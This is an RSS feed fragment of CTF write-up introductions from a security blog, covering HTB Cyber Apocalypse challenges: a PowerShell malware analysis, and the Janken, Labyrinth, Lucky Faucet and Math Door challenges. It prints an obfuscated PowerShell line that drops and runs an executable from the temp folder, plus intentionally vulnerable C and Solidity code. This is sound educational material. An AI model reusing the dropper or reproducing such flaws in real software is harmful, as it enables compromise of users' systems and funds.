&lt;span class="mtk1">${D`eCd} &lt;/span>&lt;span class="mtk5">|&lt;/span>&lt;span class="mtk1"> .(&lt;/span>&lt;span class="mtk4">"{2}{3}{1}{0}"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk4">'ent'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'t-Cont'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'S'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'e'&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1">Path &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">$env:temp&lt;/span>&lt;span class="mtk4">\tmp7102591.exe"&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1">Encoding (&lt;/span>&lt;span class="mtk4">"{1}{0}"&lt;/span>&lt;span class="mtk5">-f&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'yte'&lt;/span>&lt;span class="mtk5">,&lt;/span>&lt;span class="mtk4">'B'&lt;/span>&lt;span class="mtk1">) &lt;/span>
&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">$env:temp&lt;/span>&lt;span class="mtk4">\tmp7102591.exe"&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Well, it is not very readable, right? In fact, it is obfuscated, but we can transform it a bit by evaluating some expressions in PowerShell:&lt;/p></description></item><item><title>Janken</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/janken/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/janken/</guid><description>&lt;p>We are given a binary file called &lt;code>janken&lt;/code> and a remote instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">file&lt;/span> &lt;span class="mtku">janken&lt;/span>
janken: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/ld-linux-x86-64.so.2, BuildID[sha1]=56b54cdae265aa352fe2ebb016f86af831fd58d3, for GNU/Linux 3.2.0, not stripped 
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>It is a Rock-Paper-Scissors game:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 167.99.86.8 31902



&lt;span class="code-cyan"> ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜&lt;/span>
&lt;span class="code-cyan"> ▌ &lt;span class="code-red">じ&lt;span class="code-green"> ゃ&lt;span class="code-blue"> ん&lt;span class="code-yellow"> 拳&lt;span class="code-cyan"> ▐&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan"> ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟&lt;/span>


&lt;span class="code-cyan">1. &lt;span class="code-red">ℙ &lt;span class="code-green">∟ &lt;span class="code-blue">₳ &lt;span class="code-yellow">Ұ&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">2. &lt;span class="code-blue">ℜ &lt;span class="code-magenta">℧ &lt;span class="code-green">∟ &lt;span class="code-yellow">Ӗ &lt;span class="code-white">⅀&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>

&lt;span class="code-cyan">&amp;gt;&amp;gt; 2&lt;/span>

&lt;span class="code-cyan">▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜&lt;/span> 
&lt;span class="code-cyan">▚ &lt;span class="code-blue">[*] Rock is called "Guu" (ぐう). &lt;span class="code-cyan"> ▞&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">▞ &lt;span class="code-red">[*] Scissors is called "Choki" (ちょき).&lt;span class="code-cyan"> ▚&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">▚ &lt;span class="code-white">[*] Paper is called "Paa" (ぱあ). &lt;span class="code-cyan"> ▞&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">▞ ▚&lt;/span>
&lt;span class="code-cyan">▚ &lt;span class="code-yellow">1. &lt;span class="code-blue">Rock &lt;span class="code-yellow">&amp;gt; &lt;span class="code-red">scissors&lt;span class="code-yellow">, &lt;span class="code-red">scissors &lt;span class="code-yellow">&amp;gt; &lt;span class="code-white">paper&lt;span class="code-yellow">, &lt;span class="code-white">paper&lt;span class="code-yellow"> &amp;gt; &lt;span class="code-blue">rock&lt;span class="code-cyan">. ▞&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">▞ &lt;span class="code-yellow">2. You have to win [&lt;span class="code-green">100&lt;span class="code-yellow">] times in a row in order to get the prize. 🏆 &lt;span class="code-cyan">▚&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟&lt;/span>

&lt;span class="code-cyan">1. &lt;span class="code-red">ℙ &lt;span class="code-green">∟ &lt;span class="code-blue">₳ &lt;span class="code-yellow">Ұ&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>
&lt;span class="code-cyan">2. &lt;span class="code-blue">ℜ &lt;span class="code-magenta">℧ &lt;span class="code-green">∟ &lt;span class="code-yellow">Ӗ &lt;span class="code-white">⅀&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>

&lt;span class="code-cyan">&amp;gt;&amp;gt; 1&lt;/span>
&lt;span class="code-green">[!] Let the game begin! 🎉&lt;/span>


&lt;span class="code-cyan">[*] Round [1]:&lt;/span>

&lt;span class="code-cyan">Choose:&lt;/span>

&lt;span class="code-cyan">Rock 👊&lt;/span>
&lt;span class="code-cyan">Scissors ✂️&lt;/span>
&lt;span class="code-cyan">Paper 📜&lt;/span>

&lt;span class="code-cyan">&amp;gt;&amp;gt; rock&lt;/span>

&lt;span class="code-cyan">[!] Guru's choice: &lt;span class="code-red">rock&lt;/span>&lt;/span>
&lt;span class="code-cyan">[!] Your choice: &lt;span class="code-green">rock&lt;/span>&lt;/span>

&lt;span class="code-red">[-] You lost the game..&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Let&amp;rsquo;s analyze the binary to see if we can somehow predict the oponent&amp;rsquo;s moves.&lt;/p></description></item><item><title>Labyrinth</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/labyrinth/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>labyrinth&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little
RELRO: &lt;span class="code-dark-green">Full RELRO&lt;/span>
Stack: &lt;span class="code-dark-red">No canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-red">No PIE (0x400000)&lt;/span> 
RUNPATH: &lt;span class="code-dark-red">b'./glibc/'&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="reverse-engineering">Reverse engineering&lt;/h2>
&lt;p>If we open it in Ghidra, we will see this &lt;code>main&lt;/code> function in decompiled C code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk7 mtki">int&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">() {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">int&lt;/span>&lt;span class="mtk1"> ret;&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">char&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1">__s;&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">char&lt;/span>&lt;span class="mtk1"> data[&lt;/span>&lt;span class="mtk6">32&lt;/span>&lt;span class="mtk1">];&lt;/span>
&lt;span class="mtk1"> ulong i;&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">setup&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">banner&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk1"> data._0_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> data._8_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> data._16_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> data._24_8_ &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fwrite&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">Select door: &lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">10&lt;/span>&lt;span class="mtk1">, stdout);&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> (i &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">; i &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">65&lt;/span>&lt;span class="mtk1">; i &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> i &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (i &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">10&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fprintf&lt;/span>&lt;span class="mtk1">(stdout,&lt;/span>&lt;span class="mtk4">"Door: 00&lt;/span>&lt;span class="mtk6">%d&lt;/span>&lt;span class="mtk4"> "&lt;/span>&lt;span class="mtk1">, i);&lt;/span>
&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (i &lt;/span>&lt;span class="mtk5">&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">100&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fprintf&lt;/span>&lt;span class="mtk1">(stdout,&lt;/span>&lt;span class="mtk4">"Door: 0&lt;/span>&lt;span class="mtk6">%d&lt;/span>&lt;span class="mtk4"> "&lt;/span>&lt;span class="mtk1">, i);&lt;/span>
&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fprintf&lt;/span>&lt;span class="mtk1">(stdout,&lt;/span>&lt;span class="mtk4">"Door: &lt;/span>&lt;span class="mtk6">%d&lt;/span>&lt;span class="mtk4"> "&lt;/span>&lt;span class="mtk1">, i);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> ((i &lt;/span>&lt;span class="mtk5">%&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">10&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">&amp;amp;&amp;amp;&lt;/span>&lt;span class="mtk1"> (i &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">)) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">putchar&lt;/span>&lt;span class="mtk1">(L&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fwrite&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">&amp;gt;&amp;gt; "&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">, stdout);&lt;/span>
&lt;span class="mtk1"> __s &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk7 mtki">char&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk8">malloc&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">10&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fgets&lt;/span>&lt;span class="mtk1">(__s, &lt;/span>&lt;span class="mtk6">5&lt;/span>&lt;span class="mtk1">, stdin);&lt;/span>
&lt;span class="mtk1"> ret &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">strncmp&lt;/span>&lt;span class="mtk1">(__s, &lt;/span>&lt;span class="mtk4">"69"&lt;/span>&lt;span class="mtk1"> ,&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (ret &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> ret &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">strncmp&lt;/span>&lt;span class="mtk1">(__s, &lt;/span>&lt;span class="mtk4">"069"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (ret &lt;/span>&lt;span class="mtk5">!=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">goto&lt;/span>&lt;span class="mtk1"> LAB_004015da;&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fwrite&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">You are heading to open the door but you suddenly &lt;/span>&lt;span class="mtk4">see something on the wall:&lt;/span>&lt;span class="mtk6">\n\n\"&lt;/span>&lt;span class="mtk4">Fly li ke a bird and be free!&lt;/span>&lt;span class="mtk6">\"\n\n&lt;/span>&lt;span class="mtk4">Would you like to change the door you chose?&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">&amp;gt;&amp;gt; "&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">0x&lt;/span>&lt;span class="mtk6">a0&lt;/span>&lt;span class="mtk1">, stdout);&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fgets&lt;/span>&lt;span class="mtk1">(data, &lt;/span>&lt;span class="mtk6">68&lt;/span>&lt;span class="mtk1">, stdin);&lt;/span>
&lt;span class="mtk1">LAB_004015da:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">fprintf&lt;/span>&lt;span class="mtk1">(stdout,&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk6">\n%s&lt;/span>&lt;span class="mtk4">[-] YOU FAILED TO ESCAPE!&lt;/span>&lt;span class="mtk6">\n\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1">DAT_00402541);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We need to enter &lt;code>69&lt;/code> or &lt;code>069&lt;/code> to get to another user input; otherwise, the program will exit:&lt;/p></description></item><item><title>Lucky Faucet</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/lucky-faucet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/lucky-faucet/</guid><description>&lt;p>We are given a Solidity file called &lt;code>LuckyFaucet.sol&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk3">// SPDX-License-Identifier: MIT&lt;/span>
&lt;span class="mtk5">pragma&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">solidity&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0.7.6&lt;/span>&lt;span class="mtk1">;&lt;/span>

&lt;span class="mtk7 mtki">contract&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">LuckyFaucet&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">int64&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">public&lt;/span>&lt;span class="mtk1"> upperBound;&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">int64&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">public&lt;/span>&lt;span class="mtk1"> lowerBound;&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">constructor&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk7 mtki">payable&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3">// start with 50M-100M wei Range until player chan&lt;/span>&lt;span class="mtk3">ges it&lt;/span>
&lt;span class="mtk1"> upperBound &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">100_000_000&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> lowerBound &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">50_000_000&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">function&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">setBounds&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">int64&lt;/span>&lt;span class="mtk1"> _newLowerBound, &lt;/span>&lt;span class="mtk7 mtki">int64&lt;/span>&lt;span class="mtk1"> _newUpperBound) &lt;/span>&lt;span class="mtk7 mtki">public&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">require&lt;/span>&lt;span class="mtk1">(_newUpperBound &lt;/span>&lt;span class="mtk5">&amp;lt;=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">100_000_000&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"100M wei is the max upperBound sry"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">require&lt;/span>&lt;span class="mtk1">(_newLowerBound &lt;/span>&lt;span class="mtk5">&amp;lt;=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">50_000_000&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"50M wei is the max lowerBound sry"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">require&lt;/span>&lt;span class="mtk1">(_newLowerBound &lt;/span>&lt;span class="mtk5">&amp;lt;=&lt;/span>&lt;span class="mtk1"> _newUpperBound);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3">// why? because if you don't need this much, pls l&lt;/span>&lt;span class="mtk3">ower the upper bound :)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3">// we don't have infinite money glitch.&lt;/span>
&lt;span class="mtk1"> upperBound &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> _newUpperBound;&lt;/span>
&lt;span class="mtk1"> lowerBound &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> _newLowerBound;&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">function&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">sendRandomETH&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk7 mtki">public&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">returns&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk7 mtki">bool&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk7 mtki">uint64&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">int256&lt;/span>&lt;span class="mtk1"> randomInt &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">int256&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9">blockhash&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9">block&lt;/span>&lt;span class="mtk1">.number &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">)); &lt;/span>&lt;span class="mtk3">// "but it's not actually random 🤓"&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3">// we can safely cast to uint64 since we'll never &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3">// have to worry about sending more than 2**64 - 1&lt;/span>&lt;span class="mtk3"> wei &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">uint64&lt;/span>&lt;span class="mtk1"> amountToSend &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">uint64&lt;/span>&lt;span class="mtk1">(randomInt % (upperBound &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> lowerBound &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> lowerBound); &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">bool&lt;/span>&lt;span class="mtk1"> sent &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9">msg.sender&lt;/span>&lt;span class="mtk7">.send&lt;/span>&lt;span class="mtk1">(amountToSend);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> (sent, amountToSend);&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Moreover, we have this &lt;code>Setup.sol&lt;/code>, which is common in Solidity challenges:&lt;/p></description></item><item><title>Math Door</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>math-door&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little 
RELRO: &lt;span class="code-dark-green">Full RELRO&lt;/span>
Stack: &lt;span class="code-dark-green">Canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-green">PIE enabled&lt;/span>
RUNPATH: &lt;span class="code-dark-red">b'.'&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="setup-environment">Setup environment&lt;/h2>
&lt;p>We are also provided with the remote Glibc library and loader:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">./ld.so&lt;/span> &lt;span class="mtku">./libc.so.6&lt;/span>
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. 
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 9.4.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&amp;lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.

&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">ldd&lt;/span> &lt;span class="mtku">math-door&lt;/span>
 linux-vdso.so.1 (0x00007ffed83e6000)
 libc.so.6 =&amp;gt; ./libc.so.6 (0x00007f39ce44c000)
 ld.so =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007f39ce647000)
&lt;/code>&lt;/pre>&lt;/div>

